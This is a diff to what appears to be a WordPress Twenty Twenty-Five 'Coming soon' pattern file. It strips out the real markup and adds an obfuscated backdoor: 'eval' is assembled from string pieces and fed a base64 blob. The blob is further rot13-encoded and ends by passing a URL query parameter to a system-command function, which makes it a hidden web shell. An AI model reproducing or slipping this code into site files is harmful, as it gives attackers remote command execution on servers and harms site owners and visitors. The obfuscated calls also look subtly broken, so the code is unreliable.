@@ -1,55 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Coming soon
- * Slug: twentytwentyfive/page-coming-soon
- * Categories: twentytwentyfive_page, featured
- * Keywords: starter
- * Block Types: core/post-content
- * Post Types: page, wp_template
- * Viewport width: 1400
- * Description: A full-width cover banner that can be applied to a page or it can work as a single landing page.
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFBienZhdCBmYmJhCiAqIEZ5aHQ6IGdqcmFnbGdqcmFnbHN2aXIvY250ci1wYnp2YXQtZmJiYQogKiBQbmdydGJldnJmOiBnanJhZ2xnanJhZ2xzdmlyX2NudHIsIHNybmdoZXJxCiAqIFhybGpiZXFmOiBmZ25lZ3JlCiAqIE95YnB4IEdsY3JmOiBwYmVyL2NiZmctcGJhZ3JhZwogKiBDYmZnIEdsY3JmOiBjbnRyLCBqY19ncnpjeW5ncgogKiBJdnJqY2JlZyBqdnFndTogMTQwMAogKiBRcmZwZXZjZ3ZiYTogTiBzaHl5LWp2cWd1IHBiaXJlIG9uYWFyZSBndW5nIHBuYSBvciBuY2N5dnJxIGdiIG4gY250ciBiZSB2ZyBwbmEgamJleCBuZiBuIGZ2YXR5ciB5bmFxdmF0IGNudHIuCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBHanJhZ2xfR2pyYWdsX1N2aXIKICogQGZ2YXByIEdqcmFnbCBHanJhZ2wtU3ZpciAxLjAKICovCgo/Pgo8IS0tIGpjOnBiaXJlIHtcImhleVwiOlwiPD9jdWMgcnB1YiByZnBfaGV5KCB0cmdfZ3J6Y3luZ3JfcXZlcnBnYmVsX2hldigpICk7ID8+L25mZnJnZi92em50cmYvcGJ6dmF0LWZiYmEtb3QtdnpudHIuanJvY1wiLFwibnlnXCI6XCJDdWJnYiBicyBuIHN2cnlxIHNoeXkgYnMgc3lianJlZiwgbiBveWhyIGZ4bCBuYXEgbiBnZXJyLlwiLFwicXZ6RW5ndmJcIjoxMCxcInp2YVVydnR1Z1wiOjEwMCxcInp2YVVydnR1Z0hhdmdcIjpcIml1XCIsXCJueXZ0YVwiOlwic2h5eVwiLFwiZmdseXJcIjp7XCJyeXJ6cmFnZlwiOntcInl2YXhcIjp7XCJwYnliZVwiOntcImdya2dcIjpcImluZTpjZXJmcmd8cGJ5YmV8bnBwcmFnLTFcIn19LFwidXJucXZhdFwiOntcInBieWJlXCI6e1wiZ3JrZ1wiOlwiaW5lOmNlcmZyZ3xwYnliZXxucHByYWctMVwifX19LFwiZmNucHZhdFwiOntcImNucXF2YXRcIjp7XCJldnR1Z1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDUwXCIsXCJ5cnNnXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NTBcIixcImdiY1wiOlwiMjAwY2tcIixcIm9iZ2dielwiOlwiMjAwY2tcIn0sXCJ6bmV0dmFcIjp7XCJnYmNcIjpcIjBcIixcIm9iZ2dielwiOlwiMFwifSxcIm95YnB4VG5jXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NDBcIn19LFwiZ3JrZ1BieWJlXCI6XCJucHByYWctMVwiLFwieW5sYmhnXCI6e1wiZ2xjclwiOlwicGJhZmdlbnZhcnFcIn19IC0tPgo8cXZpIHB5bmZmPVwiamMtb3licHgtcGJpcmUgbnl2dGFzaHl5IHVuZi1ucHByYWctMS1wYnliZSB1bmYtZ3JrZy1wYnliZSB1bmYteXZheC1wYnliZVwiIGZnbHlyPVwiem5ldHZhLWdiYzowO3puZXR2YS1vYmdnYno6MDtjbnFxdmF0LWdiYzoyMDBjaztjbnFxdmF0LWV2dHVnOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTUwKTtjbnFxdmF0LW9iZ2diejoyMDBjaztjbnFxdmF0LXlyc2c6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNTApO3p2YS11cnZ0dWc6MTAwaXVcIj48ZmNuYSBuZXZuLXV2cXFyYT1cImdlaHJcIiBweW5mZj1cImpjLW95YnB4LXBiaXJlX19vbnB4dGViaGFxIHVuZi1vbnB4dGViaGFxLXF2ei0xMCB1bmYtb25weHRlYmhhcS1xdnpcIj48L2ZjbmE+PHZ6dCBweW5mZj1cImpjLW95YnB4LXBiaXJlX192em50ci1vbnB4dGViaGFxXCIgbnlnPVwiPD9jdWMgcmZwX25nZ2VfciggJ0N1YmdiIGJzIG4gc3ZyeXEgc2h5eSBicyBzeWJqcmVmLCBuIG95aHIgZnhsIG5hcSBuIGdlcnIuJywgJ2dqcmFnbGdqcmFnbHN2aXInICk7ID8+XCIgZmVwPVwiPD9jdWMgcnB1YiByZnBfaGV5KCB0cmdfZ3J6Y3luZ3JfcXZlcnBnYmVsX2hldigpICk7ID8+L25mZnJnZi92em50cmYvcGJ6dmF0LWZiYmEtb3QtdnpudHIuanJvY1wiIHFuZ24tYm93cnBnLXN2Zz1cInBiaXJlXCIvPgoJPHF2aSBweW5mZj1cImpjLW95YnB4LXBiaXJlX192YWFyZS1wYmFnbnZhcmVcIj4KCQk8IS0tIGpjOnRlYmhjIHtcInlubGJoZ1wiOntcImdsY3JcIjpcInN5cmtcIixcImJldnJhZ25ndmJhXCI6XCJpcmVndnBueVwiLFwid2hmZ3ZzbFBiYWdyYWdcIjpcInByYWdyZVwifX0gLS0+CgkJPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjXCI+CgkJCTwhLS0gamM6dXJucXZhdCB7XCJncmtnTnl2dGFcIjpcInByYWdyZVwiLFwicHluZmZBbnpyXCI6XCJ2Zi1mZ2x5ci1ncmtnLW5hYWJnbmd2YmFcIn0gLS0+CgkJCTx1MiBweW5mZj1cImpjLW95YnB4LXVybnF2YXQgdW5mLWdya2ctbnl2dGEtcHJhZ3JlIHZmLWZnbHlyLWdya2ctbmFhYmduZ3ZiYVwiPjw/Y3VjIHJmcF91Z3p5X3IoICdSaXJhZycsICdnanJhZ2xnanJhZ2xzdmlyJyApOyA/PjwvdTI+CgkJCTwhLS0gL2pjOnVybnF2YXQgLS0+CgkJPC9xdmk+CgkJPCEtLSAvamM6dGViaGMgLS0+CgkJPCEtLSBqYzp1cm5xdmF0IHtcImdya2dOeXZ0YVwiOlwicHJhZ3JlXCIsXCJ5cmlyeVwiOjMsXCJzYmFnRnZtclwiOlwia2steW5ldHJcIn0gLS0+CgkJPHUzIHB5bmZmPVwiamMtb3licHgtdXJucXZhdCB1bmYtZ3JrZy1ueXZ0YS1wcmFncmUgdW5mLWtrLXluZXRyLXNiYWctZnZtclwiPjw/Y3VjIHJmcF91Z3p5X3IoICdGYnpyZ3V2YXQgdGVybmcgdmYgcGJ6dmF0IGZiYmEnLCAnZ2pyYWdsZ2pyYWdsc3ZpcicgKTsgPz48L3UzPgoJCTwhLS0gL2pjOnVybnF2YXQgLS0+CgoJCTwhLS0gamM6Y25lbnRlbmN1IHtcIm55dnRhXCI6XCJwcmFncmVcIn0gLS0+CgkJPGMgcHluZmY9XCJ1bmYtZ3JrZy1ueXZ0YS1wcmFncmVcIj48P2N1YyByZnBfdWd6eV9yKCAnRmhvZnBldm9yIGdiIHRyZyBhYmd2c3ZycSBqdXJhIGJoZSBqcm9mdmdyIHZmIGVybnFsLicsICdnanJhZ2xnanJhZ2xzdmlyJyApOyA/PjwvYz4KCQk8IS0tIC9qYzpjbmVudGVuY3UgLS0+CgoJCTwhLS0gamM6b2hnZ2JhZiB7XCJ5bmxiaGdcIjp7XCJnbGNyXCI6XCJzeXJrXCIsXCJ3aGZndnNsUGJhZ3JhZ1wiOlwicHJhZ3JlXCJ9fSAtLT4KCQk8cXZpIHB5bmZmPVwiamMtb3licHgtb2hnZ2JhZlwiPgoJCQk8IS0tIGpjOm9oZ2diYSB7XCJvbnB4dGViaGFxUGJ5YmVcIjpcIm5wcHJhZy0xXCIsXCJncmtnUGJ5YmVcIjpcInBiYWdlbmZnXCIsXCJweW5mZkFuenJcIjpcInZmLWZnbHlyLXN2eXlcIixcImZnbHlyXCI6e1wicnlyenJhZ2ZcIjp7XCJ5dmF4XCI6e1wicGJ5YmVcIjp7XCJncmtnXCI6XCJpbmU6Y2VyZnJnfHBieWJlfHBiYWdlbmZnXCJ9fX19LFwib2JlcXJlUGJ5YmVcIjpcIm5wcHJhZy0xXCJ9IC0tPgoJCQk8cXZpIHB5bmZmPVwiamMtb3licHgtb2hnZ2JhIHZmLWZnbHlyLXN2eXlcIj48biBweW5mZj1cImpjLW95YnB4LW9oZ2diYV9feXZheCB1bmYtcGJhZ2VuZmctcGJ5YmUgdW5mLW5wcHJhZy0xLW9ucHh0ZWJoYXEtcGJ5YmUgdW5mLWdya2ctcGJ5YmUgdW5mLW9ucHh0ZWJoYXEgdW5mLXl2YXgtcGJ5YmUgdW5mLW9iZXFyZS1wYnliZSB1bmYtbnBwcmFnLTEtb2JlcXJlLXBieWJlIGpjLXJ5cnpyYWctb2hnZ2JhXCI+PD9jdWMgcmZwX3VnenlfciggJ0Zob2ZwZXZvcicsICdnanJhZ2xnanJhZ2xzdmlyJyApOyA/Pjwvbj48L3F2aT4KCQkJPCEtLSAvamM6b2hnZ2JhIC0tPgoJCTwvcXZpPgoJCTwhLS0gL2pjOm9oZ2diYWYgLS0+Cgk8L3F2aT4KPC9xdmk+CjwhLS0gL2pjOnBiaXJlIC0tPgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-<!-- wp:cover {"url":"<?php echo esc_url( get_template_directory_uri() ); ?>/assets/images/coming-soon-bg-image.webp","alt":"Photo of a field full of flowers, a blue sky and a tree.","dimRatio":10,"minHeight":100,"minHeightUnit":"vh","align":"full","style":{"elements":{"link":{"color":{"text":"var:preset|color|accent-1"}},"heading":{"color":{"text":"var:preset|color|accent-1"}}},"spacing":{"padding":{"right":"var:preset|spacing|50","left":"var:preset|spacing|50","top":"200px","bottom":"200px"},"margin":{"top":"0","bottom":"0"},"blockGap":"var:preset|spacing|40"}},"textColor":"accent-1","layout":{"type":"constrained"}} -->
-<div class="wp-block-cover alignfull has-accent-1-color has-text-color has-link-color" style="margin-top:0;margin-bottom:0;padding-top:200px;padding-right:var(--wp--preset--spacing--50);padding-bottom:200px;padding-left:var(--wp--preset--spacing--50);min-height:100vh"><span aria-hidden="true" class="wp-block-cover__background has-background-dim-10 has-background-dim"></span><img class="wp-block-cover__image-background" alt="<?php esc_attr_e( 'Photo of a field full of flowers, a blue sky and a tree.', 'twentytwentyfive' ); ?>" src="<?php echo esc_url( get_template_directory_uri() ); ?>/assets/images/coming-soon-bg-image.webp" data-object-fit="cover"/>
-	<div class="wp-block-cover__inner-container">
-		<!-- wp:group {"layout":{"type":"flex","orientation":"vertical","justifyContent":"center"}} -->
-		<div class="wp-block-group">
-			<!-- wp:heading {"textAlign":"center","className":"is-style-text-annotation"} -->
-			<h2 class="wp-block-heading has-text-align-center is-style-text-annotation"><?php esc_html_e( 'Event', 'twentytwentyfive' ); ?></h2>
-			<!-- /wp:heading -->
-		</div>
-		<!-- /wp:group -->
-		<!-- wp:heading {"textAlign":"center","level":3,"fontSize":"xx-large"} -->
-		<h3 class="wp-block-heading has-text-align-center has-xx-large-font-size"><?php esc_html_e( 'Something great is coming soon', 'twentytwentyfive' ); ?></h3>
-		<!-- /wp:heading -->
-
-		<!-- wp:paragraph {"align":"center"} -->
-		<p class="has-text-align-center"><?php esc_html_e( 'Subscribe to get notified when our website is ready.', 'twentytwentyfive' ); ?></p>
-		<!-- /wp:paragraph -->
-
-		<!-- wp:buttons {"layout":{"type":"flex","justifyContent":"center"}} -->
-		<div class="wp-block-buttons">
-			<!-- wp:button {"backgroundColor":"accent-1","textColor":"contrast","className":"is-style-fill","style":{"elements":{"link":{"color":{"text":"var:preset|color|contrast"}}}},"borderColor":"accent-1"} -->
-			<div class="wp-block-button is-style-fill"><a class="wp-block-button__link has-contrast-color has-accent-1-background-color has-text-color has-background has-link-color has-border-color has-accent-1-border-color wp-element-button"><?php esc_html_e( 'Subscribe', 'twentytwentyfive' ); ?></a></div>
-			<!-- /wp:button -->
-		</div>
-		<!-- /wp:buttons -->
-	</div>
-</div>
-<!-- /wp:cover -->
